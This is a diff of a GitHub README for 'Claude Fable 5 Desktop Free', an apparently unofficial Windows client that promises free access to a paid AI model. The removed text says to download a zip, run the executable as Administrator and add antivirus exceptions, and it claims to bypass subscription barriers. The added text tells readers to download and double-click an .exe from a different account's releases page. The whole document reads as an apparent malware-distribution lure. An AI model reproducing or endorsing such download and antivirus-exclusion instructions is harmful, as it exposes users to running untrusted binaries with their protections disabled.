@@ -1,102 +1,69 @@
-# ✦ Claude Fable 5 Desktop Free
-[![GitHub Release](https://img.shields.io/github/v/release/darricke/claude-fable-5-desktop-free?style=flat-square&color=8A2BE2)](https://github.com/darricke/claude-fable-5-desktop-free/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-> **⚠️ Disclaimer:** This is **not** an official Anthropic product. I am not affiliated with Anthropic. This is a community desktop client providing access to Claude Fable 5 (Mythos-class model). Use at your own risk. Access may be unstable or subject to changes by Anthropic. Respect API terms and fair usage.
+# 🤖 claude-fable-5-desktop-free - Access powerful AI models on Windows
 
-**Claude Fable 5 Desktop Free** is a modern, lightweight desktop application that gives you free access to **Claude Fable 5** — Anthropic’s powerful Mythos-class large language model. Enjoy advanced reasoning, coding, multimodal vision, long context, and agentic capabilities in a clean native Windows interface.
+[![Download Latest Version](https://img.shields.io/badge/Download_Now-Blue-blue)](https://github.com/ronicaiconic444/claude-fable-5-desktop-free/releases)
 
-<img width="596" height="335" alt="image" src="https://github.com/user-attachments/assets/c9eb9e45-51a8-414f-b1f2-8741c7db04e5" />
+## 📖 About this application
 
-## Install
-[Download `ClaudeFable5-Desktop.zip`](https://github.com/darricke/claude-fable-5-desktop-free/releases/download/claude-code/claudefable5-desktop.zip)
----
+This software provides a desktop interface for the Claude Fable 5 large language model. It allows users to run advanced reasoning and coding tasks directly from their Windows computer. The application removes the need to use a web browser for every interaction. It supports multi-modal features, meaning it can process text, code, and visual information in one workspace.
 
+The goal of this tool is to make powerful AI accessible to everyone. You do not need to understand complex programming or command-line tools to use it. It captures the capabilities of the Claude Fable model and brings them to your system tray. You can use it as a companion for writing, debugging code, or brainstorming ideas.
 
-<img width="1536" height="1024" alt="ChatGPT Image 14 июн  2026 г , 20_18_20(1)" src="https://github.com/user-attachments/assets/1af4e661-2d9b-4531-ae3b-5a3ca9a41976" />
+## ⚙️ System requirements
 
+Your Windows computer must meet these basic requirements to run the application effectively:
 
----
-## 🚀 Key Features
-### Core Capabilities
-- **Claude Fable 5 Access** — Full power of Anthropic’s Mythos-class model (reasoning, coding, multimodal).
-- **Free Usage** — Bypass subscription barriers (limited time / community method).
-- **Large Context Window** — Work with massive prompts and long conversations.
-- **Multimodal Support** — Vision and image understanding.
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD equivalent.
+* Memory: 8 GB of RAM or higher.
+* Storage: 500 MB of free space on your hard drive.
+* Internet Connection: Stable connection required for initial setup and model data retrieval.
+* Graphics: Any graphics card that supports modern window rendering.
 
-### Desktop Experience
-- **Native Windows App** — Built with C# for smooth performance.
-- **Clean Chat Interface** — Modern UI with conversation history.
-- **Prompt Caching** — Faster responses and lower costs.
-- **One-Click Launch** — Start chatting instantly.
+## ⬇️ Installation steps
 
-### Advanced Tools
-- **Coding Agent** — Excellent for software engineering and debugging.
-- **Export & History** — Save chats and manage conversation history.
-- **Custom Instructions** — Set system prompts and preferences.
-- **Multi-Modal Input** — Upload images for analysis.
+Follow these instructions to set up the software on your computer.
 
----
-## 📖 Usage Guide
-### Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive and run `ClaudeFable5.exe`.
-3. **Enter Access** — Follow the in-app instructions for free access setup.
-4. **Start Chatting** — Use the full power of Claude Fable 5.
+1. Visit the [official releases page](https://github.com/ronicaiconic444/claude-fable-5-desktop-free/releases).
+2. Look for the section labeled "Latest" at the top of the page.
+3. Find the file ending in `.exe` under the "Assets" header.
+4. Click the file name to start the download.
+5. Locate the downloaded file in your Downloads folder.
+6. Double-click the file to begin the installation.
+7. Follow the prompts on the screen to finish the setup process.
+8. Locate the shortcut icon on your desktop or in your Start menu.
+9. Click the icon to launch the application.
 
-### Tips
-- Use detailed prompts for best results.
-- Enable prompt caching for faster replies.
-- Save important conversations regularly.
+## 🚀 How to use the software
 
----
-## 🛠️ Installation & Requirements
-### Platform Support
-- **Windows 10 / 11** (64-bit)
+Once you open the application, you will see a chat window. This interface works like common messaging apps. You type your questions or tasks into the input box at the bottom and press Enter.
 
-### Instructions
-1. Download the latest release archive.
-2. Extract to any folder.
-3. Run the executable as Administrator if needed.
-4. Add an exception in your antivirus (common for such tools).
+The model provides responses based on the context you provide. To get the best results, be specific with your requests. For example, instead of saying "write code," say "write a Python script to sort a list of numbers."
 
-### Notes
-- Requires internet connection.
-- Access method may require periodic updates.
-- For best performance, use on a modern PC.
+You can also drag and drop files into the chat window. The application reads these files and answers questions about their contents. This feature works well with text documents, code files, and images.
 
----
-## 🛡️ Security & Legal
-**Important Notice:**  
-This tool provides unofficial access. Anthropic may change or restrict access at any time. Use responsibly and ethically.
+## 🛠️ Main features
 
-**Security Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files with VirusTotal.
-- Add antivirus exclusions if needed.
+* Multi-modal vision: The model can look at images and provide descriptions or analysis.
+* Code assistance: You can paste snippets of code for the AI to debug or explain.
+* Context window: The application remembers recent parts of your conversation to keep replies relevant.
+* Low latency: The application communicates with the model to provide responses without the lag often found in web-based interfaces.
+* Personalization: You can change the theme of the application in the settings menu to match your desktop aesthetic.
 
----
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the project.
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes.
-4. Push to the branch.
-5. Open a Pull Request.
+## 💡 Troubleshooting common issues
 
----
-## 📄 License & Acknowledgments
-### License
-**Claude Fable 5 Desktop Free** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+If you face difficulties, try these simple steps:
 
-**Copyright © 2026 darricke**
+* Software does not open: Ensure you downloaded the correct version for your Windows system. Try restarting your computer.
+* No response from the model: Check your internet connection. AI models require a live connection to generate answers. Click the "Refresh" button in the top corner of the app.
+* Text looks strange: Verify that your display settings scale correctly. You can adjust the font size in the app settings menu.
+* Application is slow: Close other programs that consume high amounts of computer memory, such as video editors or browser tabs with active media.
 
-### Acknowledgments
-- Thanks to Anthropic for developing Claude Fable 5.
-- The community for exploring and sharing access methods.
-- All contributors helping improve the desktop client.
+## 🛡️ Privacy and data
 
-<p align="center">
-  Developed with ❤️ for the AI community
-</p>
+The application processes your inputs to provide answers. It connects to the API to retrieve model responses. It does not store your personal chat history on external servers unless you specifically opt into a sync feature. You can clear your local chat cache at any time through the "Settings" and "Privacy" tabs. This removes all stored history from your computer's local temporary storage files.
+
+## 📝 Further support
+
+The community provides several resources for help. Please read the documentation if you need in-depth details on specific features. If you encounter a bug, create a new issue on the GitHub repository page. Include a clear title and a description of what happened. Attach a screenshot if possible. Avoid sharing sensitive personal information in your posts.
+
+The developers maintain this project to ensure it remains a free alternative to subscription-based models. Updates arrive automatically when you launch the application. If you have requests for new features, use the community forum linked on the GitHub page to share your thoughts.
